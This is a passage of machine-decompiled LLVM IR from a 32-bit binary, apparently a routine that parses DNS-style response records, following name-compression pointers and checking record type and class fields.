  %v1_804e92f = add i32 %v0_804e92f, 32
  %v10_804e932 = icmp eq i32 %v0_804e92a, -1
  br i1 %v10_804e932, label %dec_label_pc_804e9b4, label %dec_label_pc_804e937

dec_label_pc_804e937:                             ; preds = %dec_label_pc_804e8c3
  %v1_804e937 = icmp eq i32 %v0_804e92a, 0
  br i1 %v1_804e937, label %dec_label_pc_804e97e, label %dec_label_pc_804e93b

dec_label_pc_804e93b:                             ; preds = %dec_label_pc_804e937
  %v1_804e93b = load i32, i32* @esi, align 4
  %v2_804e93b = mul i32 %v1_804e93b, 4
  %v3_804e93b = add i32 %v0_804e92f, 4160
  %v4_804e93b = add i32 %v3_804e93b, %v2_804e93b
  %v5_804e93b = inttoptr i32 %v4_804e93b to i32*
  %v6_804e93b = load i32, i32* %v5_804e93b, align 4
  %v7_804e93b = load i32, i32* @ebx, align 4
  %v8_804e93b = urem i32 %v7_804e93b, 32
  %v9_804e93b = shl i32 1, %v8_804e93b
  %v10_804e93b = and i32 %v9_804e93b, %v6_804e93b
  %v11_804e93b = icmp ne i32 %v10_804e93b, 0
  %v1_804e943 = zext i1 %v11_804e93b to i32
  %v3_804e943 = and i32 %v0_804e92a, -256
  %v4_804e943 = or i32 %v1_804e943, %v3_804e943
  store i32 %v4_804e943, i32* %eax.global-to-local, align 4
  %v4_804e946 = icmp eq i1 %v11_804e93b, false
  br i1 %v4_804e946, label %dec_label_pc_804e9b4, label %dec_label_pc_804e94a

dec_label_pc_804e94a:                             ; preds = %dec_label_pc_804e93b
  %v2_804e94a = add i32 %v0_804e92f, 28
  %v3_804e94a = inttoptr i32 %v2_804e94a to i32*
  store i32 %v4_804e943, i32* %v3_804e94a, align 4
  %v0_804e94b = load i32, i32* %eax.global-to-local, align 4
  %v2_804e94b = add i32 %v0_804e92f, 24
  %v3_804e94b = inttoptr i32 %v2_804e94b to i32*
  store i32 %v0_804e94b, i32* %v3_804e94b, align 4
  %v1_804e94c = add i32 %v0_804e92f, 20
  %v2_804e94c = inttoptr i32 %v1_804e94c to i32*
  store i32 0, i32* %v2_804e94c, align 4
  %v1_804e94e = add i32 %v0_804e92f, 16
  %v2_804e94e = inttoptr i32 %v1_804e94e to i32*
  store i32 0, i32* %v2_804e94e, align 4
  %v1_804e950 = add i32 %v0_804e92f, 12
  %v2_804e950 = inttoptr i32 %v1_804e950 to i32*
  store i32 16384, i32* %v2_804e950, align 4
  %v1_804e955 = add i32 %v0_804e92f, 8
  %v2_804e955 = inttoptr i32 %v1_804e955 to i32*
  store i32 2048, i32* %v2_804e955, align 4
  %v1_804e95a = add i32 %v0_804e92f, 64
  store i32 %v1_804e95a, i32* %eax.global-to-local, align 4
  %v2_804e95e = add i32 %v0_804e92f, 4
  %v3_804e95e = inttoptr i32 %v2_804e95e to i32*
  store i32 %v1_804e95a, i32* %v3_804e95e, align 4
  %v0_804e95f = load i32, i32* @ebp, align 4
  %v3_804e95f = inttoptr i32 %v0_804e92f to i32*
  store i32 %v0_804e95f, i32* %v3_804e95f, align 4
  %v0_804e960 = call i32 @function_8050251()
  store i32 %v0_804e960, i32* %eax.global-to-local, align 4
  %v0_804e965 = load i32, i32* @esp, align 4
  store i32 %v0_804e960, i32* @ebx, align 4
  %v1_804e96a = add i32 %v0_804e965, 56
  %v2_804e96a = inttoptr i32 %v1_804e96a to i32*
  %v3_804e96a = load i32, i32* %v2_804e96a, align 4
  store i32 %v3_804e96a, i32* %eax.global-to-local, align 4
  %v2_804e96e = add i32 %v0_804e965, 16
  %v3_804e96e = inttoptr i32 %v2_804e96e to i32*
  store i32 %v3_804e96a, i32* %v3_804e96e, align 4
  %v2_804e96f = call i32 @function_804f5b0(i8* inttoptr (i32 1 to i8*))
  %v1_804e974 = add i32 %v2_804e96f, 17
  store i32 %v1_804e974, i32* %eax.global-to-local, align 4
  %v0_804e977 = load i32, i32* @esp, align 4
  %v1_804e977 = add i32 %v0_804e977, 16
  %v0_804e97a = load i32, i32* @ebx, align 4
  %v7_804e97a = icmp ult i32 %v0_804e97a, %v1_804e974
  %v1_804e97c = icmp eq i1 %v7_804e97a, false
  br i1 %v1_804e97c, label %dec_label_pc_804e9da, label %dec_label_pc_804e97e

dec_label_pc_804e97e:                             ; preds = %dec_label_pc_804ea06, %dec_label_pc_804e9da, %dec_label_pc_804e94a, %dec_label_pc_804e937
  %v0_804e97e = phi i32 [ %v1_804e9f3, %dec_label_pc_804ea06 ], [ %v1_804e9f3, %dec_label_pc_804e9da ], [ %v1_804e977, %dec_label_pc_804e94a ], [ %v1_804e92f, %dec_label_pc_804e937 ]
  %v1_804e97e = add i32 %v0_804e97e, 8
  %v2_804e97e = inttoptr i32 %v1_804e97e to i32*
  %v3_804e97e = load i32, i32* %v2_804e97e, align 4
  %v12_804e97e = icmp eq i32 %v3_804e97e, 5
  br i1 %v12_804e97e, label %dec_label_pc_804e9b4, label %dec_label_pc_804e985

dec_label_pc_804e985:                             ; preds = %dec_label_pc_804e9a0, %dec_label_pc_804e97e
  %v3_804e985 = phi i32 [ %v3_804e9ad, %dec_label_pc_804e9a0 ], [ %v3_804e97e, %dec_label_pc_804e97e ]
  %v1_804e98d = phi i32 [ %v1_804e9aa, %dec_label_pc_804e9a0 ], [ %v0_804e97e, %dec_label_pc_804e97e ]
  %v1_804e985 = add i32 %v1_804e98d, 8
  %v2_804e985 = inttoptr i32 %v1_804e985 to i32*
  %v1_804e989 = add i32 %v3_804e985, 1
  store i32 %v1_804e989, i32* @edi, align 4
  %v0_804e98a = load i32, i32* @ebp, align 4
  %v10_804e98a = icmp eq i32 %v0_804e98a, -1
  store i32 %v1_804e989, i32* %v2_804e985, align 4
  %v1_804e991 = icmp eq i1 %v10_804e98a, false
  br i1 %v1_804e991, label %dec_label_pc_804e860.loopexit, label %dec_label_pc_804e86c

dec_label_pc_804e9a0:                             ; preds = %dec_label_pc_804e8a1, %dec_label_pc_804e886, %dec_label_pc_804e86c
  %v0_804e9a0.in = phi i32 [ %v0_804e8b9, %dec_label_pc_804e8a1 ], [ %v0_804e897, %dec_label_pc_804e886 ], [ %v0_804e878, %dec_label_pc_804e86c ]
  %v2_804e9a3 = inttoptr i32 %v0_804e9a0.in to i32*
  store i32 1, i32* %v2_804e9a3, align 4
  %v1_804e9a5 = call i32 @function_8051700(i32 1)
  store i32 %v1_804e9a5, i32* %eax.global-to-local, align 4
  %v0_804e9aa = load i32, i32* @esp, align 4
  %v1_804e9aa = add i32 %v0_804e9aa, 16
  %v1_804e9ad = add i32 %v0_804e9aa, 24
  %v2_804e9ad = inttoptr i32 %v1_804e9ad to i32*
  %v3_804e9ad = load i32, i32* %v2_804e9ad, align 4
  %v12_804e9ad = icmp eq i32 %v3_804e9ad, 5
  %v1_804e9b2 = icmp eq i1 %v12_804e9ad, false
  br i1 %v1_804e9b2, label %dec_label_pc_804e985, label %dec_label_pc_804e9b4

dec_label_pc_804e9b4:                             ; preds = %dec_label_pc_804e9a0, %dec_label_pc_804e97e, %dec_label_pc_804e93b, %dec_label_pc_804e8c3, %dec_label_pc_804ea14, %dec_label_pc_804ea1d.backedge
  %v0_804e9b4 = phi i32 [ %v0_804ea22122, %dec_label_pc_804ea14 ], [ %v0_804ea22, %dec_label_pc_804ea1d.backedge ], [ %v1_804e9aa, %dec_label_pc_804e9a0 ], [ %v0_804e97e, %dec_label_pc_804e97e ], [ %v1_804e92f, %dec_label_pc_804e93b ], [ %v1_804e92f, %dec_label_pc_804e8c3 ]
  %v0_804e9b7 = load i32, i32* @ebp, align 4
  %v2_804e9b7 = add i32 %v0_804e9b4, -16
  %v3_804e9b7 = inttoptr i32 %v2_804e9b7 to i32*
  store i32 %v0_804e9b7, i32* %v3_804e9b7, align 4
  %v1_804e9b8 = call i32 @function_804fb51(i32 1)
  store i32 %v1_804e9b8, i32* %eax.global-to-local, align 4
  %v0_804e9bd = load i32, i32* @esp, align 4
  %v1_804e9bd = add i32 %v0_804e9bd, 16
  %v1_804e9c0 = inttoptr i32 %v1_804e9bd to i32*
  %v2_804e9c0 = load i32, i32* %v1_804e9c0, align 4
  store i32 %v2_804e9c0, i32* %edx.global-to-local, align 4
  %v1_804e9c3 = inttoptr i32 %v2_804e9c0 to i8*
  %v2_804e9c3 = load i8, i8* %v1_804e9c3, align 1
  %v3_804e9c3 = icmp eq i8 %v2_804e9c3, 0
  br i1 %v3_804e9c3, label %dec_label_pc_804eac3, label %dec_label_pc_804e9cc

dec_label_pc_804e9cc:                             ; preds = %dec_label_pc_804e9b4
  %v2_804e9cc = load i32, i32* %v1_804e9c0, align 4
  store i32 %v2_804e9cc, i32* %eax.global-to-local, align 4
  %v3_804e9d6 = add i32 %v0_804e9bd, 4308
  %v1_804e9d7 = inttoptr i32 %v3_804e9d6 to i32*
  %v2_804e9d7 = load i32, i32* %v1_804e9d7, align 4
  store i32 %v2_804e9d7, i32* @edi, align 4
  %v3_804e9d7 = add i32 %v0_804e9bd, 4312
  %v1_804e9d8 = inttoptr i32 %v3_804e9d7 to i32*
  %v2_804e9d8 = load i32, i32* %v1_804e9d8, align 4
  store i32 %v2_804e9d8, i32* @ebp, align 4
  ret i32 %v2_804e9cc

dec_label_pc_804e9da:                             ; preds = %dec_label_pc_804e94a
  %v1_804e9da = add i32 %v0_804e977, 60
  store i32 %v1_804e9da, i32* %edx.global-to-local, align 4
  %v2_804e9de = add i32 %v0_804e977, 40
  %v3_804e9de = inttoptr i32 %v2_804e9de to i32*
  store i32 %v1_804e9da, i32* %v3_804e9de, align 4
  %v0_804e9e2 = load i32, i32* @esp, align 4
  %v1_804e9e5 = add i32 %v0_804e9e2, 44
  store i32 %v1_804e9e5, i32* %ecx.global-to-local, align 4
  %v2_804e9e9 = add i32 %v0_804e9e2, -16
  %v3_804e9e9 = inttoptr i32 %v2_804e9e9 to i32*
  store i32 %v1_804e9e5, i32* %v3_804e9e9, align 4
  %v2_804e9ea = call i32 @function_804f5b0(i8* inttoptr (i32 1 to i8*))
  store i32 %v2_804e9ea, i32* %eax.global-to-local, align 4
  %v0_804e9ef = load i32, i32* @esp, align 4
  %v2_804e9ef = add i32 %v2_804e9ea, 65
  %v3_804e9ef = add i32 %v2_804e9ef, %v0_804e9ef
  store i32 %v3_804e9ef, i32* %ecx.global-to-local, align 4
  %v1_804e9f3 = add i32 %v0_804e9ef, 16
  %v1_804e9f6 = add i32 %v0_804e9ef, 30
  %v2_804e9f6 = inttoptr i32 %v1_804e9f6 to i16*
  %v3_804e9f6 = load i16, i16* %v2_804e9f6, align 2
  %v4_804e9f6 = zext i16 %v3_804e9f6 to i32
  %v7_804e9f6 = and i32 %v1_804e8dd, -65536
  %v8_804e9f6 = or i32 %v4_804e9f6, %v7_804e9f6
  store i32 %v8_804e9f6, i32* @edi, align 4
  %v3_804e9fb = add i32 %v0_804e9ef, 48
  %v4_804e9fb = inttoptr i32 %v3_804e9fb to i16*
  %v5_804e9fb = load i16, i16* %v4_804e9fb, align 2
  %v16_804e9fb = icmp eq i16 %v3_804e9f6, %v5_804e9fb
  %v1_804ea00 = icmp eq i1 %v16_804e9fb, false
  br i1 %v1_804ea00, label %dec_label_pc_804e97e, label %dec_label_pc_804ea06

dec_label_pc_804ea06:                             ; preds = %dec_label_pc_804e9da
  %v1_804ea06 = add i32 %v0_804e9ef, 54
  %v2_804ea06 = inttoptr i32 %v1_804ea06 to i16*
  %v3_804ea06 = load i16, i16* %v2_804ea06, align 2
  %v4_804ea06 = zext i16 %v3_804ea06 to i32
  %v6_804ea06 = and i32 %v2_804e9ea, -65536
  %v7_804ea06 = or i32 %v4_804ea06, %v6_804ea06
  store i32 %v7_804ea06, i32* %eax.global-to-local, align 4
  %v4_804ea0b = icmp eq i16 %v3_804ea06, 0
  br i1 %v4_804ea0b, label %dec_label_pc_804e97e, label %dec_label_pc_804ea14

dec_label_pc_804ea14:                             ; preds = %dec_label_pc_804ea06
  %v2_804ea14 = call i16 @llvm.bswap.i16(i16 %v3_804ea06)
  %v3_804ea14 = zext i16 %v2_804ea14 to i32
  %v6_804ea14 = or i32 %v3_804ea14, %v6_804ea06
  store i32 %v6_804ea14, i32* %eax.global-to-local, align 4
  %v3_804ea18 = add i32 %v0_804e9ef, 38
  %v4_804ea18 = inttoptr i32 %v3_804ea18 to i16*
  store i16 %v2_804ea14, i16* %v4_804ea18, align 2
  %v0_804ea1d117 = load i32, i32* @esp, align 4
  %v1_804ea1d118 = add i32 %v0_804ea1d117, 22
  %v2_804ea1d119 = inttoptr i32 %v1_804ea1d118 to i16*
  %v3_804ea1d120 = load i16, i16* %v2_804ea1d119, align 2
  %v4_804ea1d121 = add i16 %v3_804ea1d120, -1
  store i16 %v4_804ea1d121, i16* %v2_804ea1d119, align 2
  %v0_804ea22122 = load i32, i32* @esp, align 4
  %v1_804ea22123 = add i32 %v0_804ea22122, 22
  %v2_804ea22124 = inttoptr i32 %v1_804ea22123 to i16*
  %v3_804ea22125 = load i16, i16* %v2_804ea22124, align 2
  %v13_804ea22126 = icmp eq i16 %v3_804ea22125, -1
  br i1 %v13_804ea22126, label %dec_label_pc_804e9b4, label %dec_label_pc_804ea2a

dec_label_pc_804ea2a:                             ; preds = %dec_label_pc_804ea14, %dec_label_pc_804ea1d.backedge
  %v0_804ea22127 = phi i32 [ %v0_804ea22, %dec_label_pc_804ea1d.backedge ], [ %v0_804ea22122, %dec_label_pc_804ea14 ]
  %v0_804ea2a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804ea2a, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804ea3311 = inttoptr i32 %v0_804ea2a to i8*
  %v2_804ea3312 = load i8, i8* %v1_804ea3311, align 1
  %v3_804ea3313 = zext i8 %v2_804ea3312 to i32
  %v4_804ea3314 = load i32, i32* %eax.global-to-local, align 4
  %v5_804ea3315 = and i32 %v4_804ea3314, -256
  %v6_804ea3316 = or i32 %v5_804ea3315, %v3_804ea3313
  store i32 %v6_804ea3316, i32* %eax.global-to-local, align 4
  %v4_804ea3517 = icmp eq i8 %v2_804ea3312, 0
  br i1 %v4_804ea3517, label %dec_label_pc_804ea6a, label %dec_label_pc_804ea39.preheader.preheader

dec_label_pc_804ea39.preheader.preheader:         ; preds = %dec_label_pc_804ea2a
  %v1_804ea5e = add i32 %v0_804ea22127, 32
  br label %dec_label_pc_804ea39.preheader

dec_label_pc_804ea39.preheader:                   ; preds = %dec_label_pc_804ea39.preheader.preheader, %dec_label_pc_804eafc
  %v0_804eb00 = phi i32 [ %v3_804eb00, %dec_label_pc_804eafc ], [ 1, %dec_label_pc_804ea39.preheader.preheader ]
  %v0_804eafd43 = phi i32 [ %v0_804eafd, %dec_label_pc_804eafc ], [ 0, %dec_label_pc_804ea39.preheader.preheader ]
  %v0_804ea4639 = phi i32 [ %v1_804eafc, %dec_label_pc_804eafc ], [ %v0_804ea2a, %dec_label_pc_804ea39.preheader.preheader ]
  %v0_804ea3937 = phi i32 [ %v6_804ea33, %dec_label_pc_804eafc ], [ %v6_804ea3316, %dec_label_pc_804ea39.preheader.preheader ]
  br label %dec_label_pc_804ea39

dec_label_pc_804ea39:                             ; preds = %dec_label_pc_804ea39.preheader, %dec_label_pc_804ea41
  %v0_804eafd = phi i32 [ %v0_804eafd43, %dec_label_pc_804ea39.preheader ], [ 1, %dec_label_pc_804ea41 ]
  %v0_804eafc = phi i32 [ %v0_804ea4639, %dec_label_pc_804ea39.preheader ], [ %v2_804ea62, %dec_label_pc_804ea41 ]
  %v4_804ea33 = phi i32 [ %v0_804ea3937, %dec_label_pc_804ea39.preheader ], [ %v6_804ea64, %dec_label_pc_804ea41 ]
  %v1_804ea39 = trunc i32 %v4_804ea33 to i8
  %tmp139 = icmp ult i8 %v1_804ea39, -64
  br i1 %tmp139, label %dec_label_pc_804eafc, label %dec_label_pc_804ea41

dec_label_pc_804ea41:                             ; preds = %dec_label_pc_804ea39
  %v1_804ea41 = urem i32 %v4_804ea33, 256
  store i32 %v1_804ea41, i32* %eax.global-to-local, align 4
  %v1_804ea46 = add i32 %v0_804eafc, 1
  %v2_804ea46 = inttoptr i32 %v1_804ea46 to i8*
  %v3_804ea46 = load i8, i8* %v2_804ea46, align 1
  %v4_804ea46 = zext i8 %v3_804ea46 to i32
  store i32 1, i32* @ebx, align 4
  %v2_804ea54 = mul nuw nsw i32 %v1_804ea41, 256
  %v2_804ea57 = add nsw i32 %v2_804ea54, -49152
  %v3_804ea57 = or i32 %v4_804ea46, %v2_804ea57
  store i32 %v3_804ea57, i32* %eax.global-to-local, align 4
  %v2_804ea62 = add i32 %v1_804ea5e, %v3_804ea57
  store i32 %v2_804ea62, i32* %edx.global-to-local, align 4
  %v1_804ea64 = inttoptr i32 %v2_804ea62 to i8*
  %v2_804ea64 = load i8, i8* %v1_804ea64, align 1
  %v3_804ea64 = zext i8 %v2_804ea64 to i32
  %v6_804ea64 = or i32 %v3_804ea64, %v2_804ea57
  store i32 %v6_804ea64, i32* %eax.global-to-local, align 4
  %v4_804ea66 = icmp eq i8 %v2_804ea64, 0
  %v1_804ea68 = icmp eq i1 %v4_804ea66, false
  br i1 %v1_804ea68, label %dec_label_pc_804ea39, label %dec_label_pc_804ea6a

dec_label_pc_804ea6a:                             ; preds = %dec_label_pc_804eafc, %dec_label_pc_804ea41, %dec_label_pc_804ea2a
  %v4_804ea8623 = phi i32 [ %v6_804ea3316, %dec_label_pc_804ea2a ], [ %v6_804ea64, %dec_label_pc_804ea41 ], [ %v6_804ea33, %dec_label_pc_804eafc ]
  %v5_804eb20 = phi i32 [ %v0_804ea2a, %dec_label_pc_804ea2a ], [ %v2_804ea62, %dec_label_pc_804ea41 ], [ %v1_804eafc, %dec_label_pc_804eafc ]
  %v1_804ea6a = phi i32 [ 0, %dec_label_pc_804ea2a ], [ 1, %dec_label_pc_804ea41 ], [ %v0_804eafd, %dec_label_pc_804eafc ]
  %v0_804ea6a = phi i32 [ 1, %dec_label_pc_804ea2a ], [ %v0_804eb00, %dec_label_pc_804ea41 ], [ %v3_804eb00, %dec_label_pc_804eafc ]
  %v2_804ea6a = add i32 %v1_804ea6a, %v0_804ea2a
  %v2_804ea6c = add i32 %v2_804ea6a, %v0_804ea6a
  store i32 %v2_804ea6c, i32* @esi, align 4
  %v1_804ea6f = inttoptr i32 %v2_804ea6c to i16*
  %v2_804ea6f = load i16, i16* %v1_804ea6f, align 2
  %v8_804ea6f = icmp eq i16 %v2_804ea6f, 256
  %v1_804ea74 = add i32 %v2_804ea6c, 10
  store i32 %v1_804ea74, i32* @edi, align 4
  br i1 %v8_804ea6f, label %dec_label_pc_804eb14, label %dec_label_pc_804ea7d

dec_label_pc_804ea7d:                             ; preds = %dec_label_pc_804eb14, %dec_label_pc_804ea6a
  store i32 %v1_804ea74, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804ea8620 = inttoptr i32 %v1_804ea74 to i8*
  %v2_804ea8621 = load i8, i8* %v1_804ea8620, align 1
  %v3_804ea8622 = zext i8 %v2_804ea8621 to i32
  %v5_804ea8624 = and i32 %v4_804ea8623, -256
  %v6_804ea8625 = or i32 %v3_804ea8622, %v5_804ea8624
  store i32 %v6_804ea8625, i32* %eax.global-to-local, align 4
  %v4_804ea8826 = icmp eq i8 %v2_804ea8621, 0
  br i1 %v4_804ea8826, label %dec_label_pc_804eab9, label %dec_label_pc_804ea8c.preheader.preheader

dec_label_pc_804ea8c.preheader.preheader:         ; preds = %dec_label_pc_804ea7d
  %v1_804eaad = add i32 %v0_804ea22127, 32
  br label %dec_label_pc_804ea8c.preheader

dec_label_pc_804ea8c.preheader:                   ; preds = %dec_label_pc_804ea8c.preheader.preheader, %dec_label_pc_804eb08
  %v0_804eb0c = phi i32 [ %v3_804eb0c, %dec_label_pc_804eb08 ], [ 1, %dec_label_pc_804ea8c.preheader.preheader ]
  %v0_804eb0962 = phi i32 [ %v0_804eb09, %dec_label_pc_804eb08 ], [ 0, %dec_label_pc_804ea8c.preheader.preheader ]
  %v0_804ea9558 = phi i32 [ %v1_804eb08, %dec_label_pc_804eb08 ], [ %v1_804ea74, %dec_label_pc_804ea8c.preheader.preheader ]
  %v0_804ea8c56 = phi i32 [ %v6_804ea86, %dec_label_pc_804eb08 ], [ %v6_804ea8625, %dec_label_pc_804ea8c.preheader.preheader ]
  br label %dec_label_pc_804ea8c

dec_label_pc_804ea8c:                             ; preds = %dec_label_pc_804ea8c.preheader, %dec_label_pc_804ea90
  %v0_804eb09 = phi i32 [ %v0_804eb0962, %dec_label_pc_804ea8c.preheader ], [ 1, %dec_label_pc_804ea90 ]
  %v0_804eb08 = phi i32 [ %v0_804ea9558, %dec_label_pc_804ea8c.preheader ], [ %v2_804eab1, %dec_label_pc_804ea90 ]
  %v4_804ea86 = phi i32 [ %v0_804ea8c56, %dec_label_pc_804ea8c.preheader ], [ %v6_804eab3, %dec_label_pc_804ea90 ]
  %v1_804ea8c = trunc i32 %v4_804ea86 to i8
  %tmp140 = icmp ult i8 %v1_804ea8c, -64
  br i1 %tmp140, label %dec_label_pc_804eb08, label %dec_label_pc_804ea90

dec_label_pc_804ea90:                             ; preds = %dec_label_pc_804ea8c
  %v1_804ea90 = urem i32 %v4_804ea86, 256
  store i32 %v1_804ea90, i32* %eax.global-to-local, align 4
  %v1_804ea95 = add i32 %v0_804eb08, 1
  %v2_804ea95 = inttoptr i32 %v1_804ea95 to i8*
  %v3_804ea95 = load i8, i8* %v2_804ea95, align 1
  %v4_804ea95 = zext i8 %v3_804ea95 to i32
  store i32 1, i32* %ecx.global-to-local, align 4
  %v2_804eaa3 = mul nuw nsw i32 %v1_804ea90, 256
  %v2_804eaa6 = add nsw i32 %v2_804eaa3, -49152
  %v3_804eaa6 = or i32 %v4_804ea95, %v2_804eaa6
  store i32 %v3_804eaa6, i32* %eax.global-to-local, align 4
  %v2_804eab1 = add i32 %v1_804eaad, %v3_804eaa6
  store i32 %v2_804eab1, i32* %edx.global-to-local, align 4
  %v1_804eab3 = inttoptr i32 %v2_804eab1 to i8*
  %v2_804eab3 = load i8, i8* %v1_804eab3, align 1
  %v3_804eab3 = zext i8 %v2_804eab3 to i32
  %v6_804eab3 = or i32 %v3_804eab3, %v2_804eaa6
  store i32 %v6_804eab3, i32* %eax.global-to-local, align 4
  %v4_804eab5 = icmp eq i8 %v2_804eab3, 0
  %v1_804eab7 = icmp eq i1 %v4_804eab5, false
  br i1 %v1_804eab7, label %dec_label_pc_804ea8c, label %dec_label_pc_804eab9

dec_label_pc_804eab9:                             ; preds = %dec_label_pc_804eb08, %dec_label_pc_804ea90, %dec_label_pc_804ea7d
  %v1_804eab9 = phi i32 [ 0, %dec_label_pc_804ea7d ], [ 1, %dec_label_pc_804ea90 ], [ %v0_804eb09, %dec_label_pc_804eb08 ]
  %v0_804eab9 = phi i32 [ 1, %dec_label_pc_804ea7d ], [ %v0_804eb0c, %dec_label_pc_804ea90 ], [ %v3_804eb0c, %dec_label_pc_804eb08 ]
  %v2_804eab9 = add i32 %v0_804eab9, %v1_804eab9
  store i32 %v2_804eab9, i32* @ebx, align 4
  %v2_804eabb = add i32 %v2_804eab9, %v1_804ea74
  br label %dec_label_pc_804ea1d.backedge

dec_label_pc_804ea1d.backedge:                    ; preds = %dec_label_pc_804eab9, %dec_label_pc_804eb30
  %v0_804ea1d = phi i32 [ %v0_804ea22127, %dec_label_pc_804eab9 ], [ %v0_804ea1d.pre, %dec_label_pc_804eb30 ]
  %storemerge = phi i32 [ %v2_804eabb, %dec_label_pc_804eab9 ], [ %v2_804eb3b, %dec_label_pc_804eb30 ]
  store i32 %storemerge, i32* %ecx.global-to-local, align 4
  %v1_804ea1d = add i32 %v0_804ea1d, 22
  %v2_804ea1d = inttoptr i32 %v1_804ea1d to i16*
  %v3_804ea1d = load i16, i16* %v2_804ea1d, align 2
  %v4_804ea1d = add i16 %v3_804ea1d, -1
  store i16 %v4_804ea1d, i16* %v2_804ea1d, align 2
  %v0_804ea22 = load i32, i32* @esp, align 4
  %v1_804ea22 = add i32 %v0_804ea22, 22
  %v2_804ea22 = inttoptr i32 %v1_804ea22 to i16*
  %v3_804ea22 = load i16, i16* %v2_804ea22, align 2
  %v13_804ea22 = icmp eq i16 %v3_804ea22, -1
  br i1 %v13_804ea22, label %dec_label_pc_804e9b4, label %dec_label_pc_804ea2a

dec_label_pc_804eac3:                             ; preds = %dec_label_pc_804e9b4
  %v1_804eac3 = add i32 %v2_804e9c0, 4
  %v2_804eac3 = inttoptr i32 %v1_804eac3 to i32*
  %v3_804eac3 = load i32, i32* %v2_804eac3, align 4
  store i32 %v3_804eac3, i32* %eax.global-to-local, align 4
  %v1_804eac6 = icmp eq i32 %v3_804eac3, 0
  br i1 %v1_804eac6, label %dec_label_pc_804ead6, label %dec_label_pc_804eaca

dec_label_pc_804eaca:                             ; preds = %dec_label_pc_804eac3
  %v3_804eacd = inttoptr i32 %v0_804e9bd to i32*
  store i32 %v3_804eac3, i32* %v3_804eacd, align 4
  %v1_804eace = call i32 @function_80512a9(i32 1)
  store i32 %v1_804eace, i32* %eax.global-to-local, align 4
  %v0_804ead3 = load i32, i32* @esp, align 4
  %v1_804ead3 = add i32 %v0_804ead3, 16
  br label %dec_label_pc_804ead6

dec_label_pc_804ead6:                             ; preds = %dec_label_pc_804eac3, %dec_label_pc_804eaca
  %v0_804ead6 = phi i32 [ %v1_804e9bd, %dec_label_pc_804eac3 ], [ %v1_804ead3, %dec_label_pc_804eaca ]
  %v2_804ead9 = inttoptr i32 %v0_804ead6 to i32*
  %v3_804ead9 = load i32, i32* %v2_804ead9, align 4
  store i32 %v3_804ead9, i32* @esi, align 4
  %v2_804eadd = add i32 %v0_804ead6, -16
  %v3_804eadd = inttoptr i32 %v2_804eadd to i32*
  store i32 %v3_804ead9, i32* %v3_804eadd, align 4
  %v1_804eade = call i32 @function_80512a9(i32 1)
  store i32 %v1_804eade, i32* %eax.global-to-local, align 4
  %v0_804eae3 = load i32, i32* @esp, align 4
  %v1_804eae3 = add i32 %v0_804eae3, 16
  %v2_804eae3 = inttoptr i32 %v1_804eae3 to i32*
  store i32 0, i32* %v2_804eae3, align 4
  %v0_804eaeb = load i32, i32* @esp, align 4
  %v1_804eaeb = add i32 %v0_804eaeb, 16
  %v1_804eaee = inttoptr i32 %v1_804eaeb to i32*
  %v2_804eaee = load i32, i32* %v1_804eaee, align 4
  store i32 %v2_804eaee, i32* %eax.global-to-local, align 4
  %v3_804eaf8 = add i32 %v0_804eaeb, 4308
  %v1_804eaf9 = inttoptr i32 %v3_804eaf8 to i32*
  %v2_804eaf9 = load i32, i32* %v1_804eaf9, align 4
  store i32 %v2_804eaf9, i32* @edi, align 4
  %v3_804eaf9 = add i32 %v0_804eaeb, 4312
  %v1_804eafa = inttoptr i32 %v3_804eaf9 to i32*
  %v2_804eafa = load i32, i32* %v1_804eafa, align 4
  store i32 %v2_804eafa, i32* @ebp, align 4
  ret i32 %v2_804eaee

dec_label_pc_804eafc:                             ; preds = %dec_label_pc_804ea39
  %v1_804eafc = add i32 %v0_804eafc, 1
  store i32 %v1_804eafc, i32* %edx.global-to-local, align 4
  %v5_804eafd = icmp eq i32 %v0_804eafd, 0
  %v2_804eb00 = zext i1 %v5_804eafd to i32
  %v3_804eb00 = add i32 %v2_804eb00, %v0_804eb00
  %v1_804ea33 = inttoptr i32 %v1_804eafc to i8*
  %v2_804ea33 = load i8, i8* %v1_804ea33, align 1
  %v3_804ea33 = zext i8 %v2_804ea33 to i32
  %v5_804ea33 = and i32 %v4_804ea33, -256
  %v6_804ea33 = or i32 %v3_804ea33, %v5_804ea33
  store i32 %v6_804ea33, i32* %eax.global-to-local, align 4
  %v4_804ea35 = icmp eq i8 %v2_804ea33, 0
  br i1 %v4_804ea35, label %dec_label_pc_804ea6a, label %dec_label_pc_804ea39.preheader

dec_label_pc_804eb08:                             ; preds = %dec_label_pc_804ea8c
  %v1_804eb08 = add i32 %v0_804eb08, 1
  store i32 %v1_804eb08, i32* %edx.global-to-local, align 4
  %v5_804eb09 = icmp eq i32 %v0_804eb09, 0
  %v2_804eb0c = zext i1 %v5_804eb09 to i32
  %v3_804eb0c = add i32 %v2_804eb0c, %v0_804eb0c
  %v1_804ea86 = inttoptr i32 %v1_804eb08 to i8*
  %v2_804ea86 = load i8, i8* %v1_804ea86, align 1
  %v3_804ea86 = zext i8 %v2_804ea86 to i32
  %v5_804ea86 = and i32 %v4_804ea86, -256
  %v6_804ea86 = or i32 %v3_804ea86, %v5_804ea86
  store i32 %v6_804ea86, i32* %eax.global-to-local, align 4
  %v4_804ea88 = icmp eq i8 %v2_804ea86, 0
  br i1 %v4_804ea88, label %dec_label_pc_804eab9, label %dec_label_pc_804ea8c.preheader

dec_label_pc_804eb14:                             ; preds = %dec_label_pc_804ea6a
  %v1_804eb14 = add i32 %v2_804ea6c, 2
  %v2_804eb14 = inttoptr i32 %v1_804eb14 to i16*
  %v3_804eb14 = load i16, i16* %v2_804eb14, align 2
  %v9_804eb14 = icmp eq i16 %v3_804eb14, 256
  %v1_804eb1a = icmp eq i1 %v9_804eb14, false
  br i1 %v1_804eb1a, label %dec_label_pc_804ea7d, label %dec_label_pc_804eb20

dec_label_pc_804eb20:                             ; preds = %dec_label_pc_804eb14
  %v1_804eb20 = add i32 %v2_804ea6c, 8
  %v2_804eb20 = inttoptr i32 %v1_804eb20 to i16*
  %v3_804eb20 = load i16, i16* %v2_804eb20, align 2
  %v4_804eb20 = zext i16 %v3_804eb20 to i32
  %v6_804eb20 = and i32 %v5_804eb20, -65536
  %v7_804eb20 = or i32 %v4_804eb20, %v6_804eb20
  store i32 %v7_804eb20, i32* %edx.global-to-local, align 4
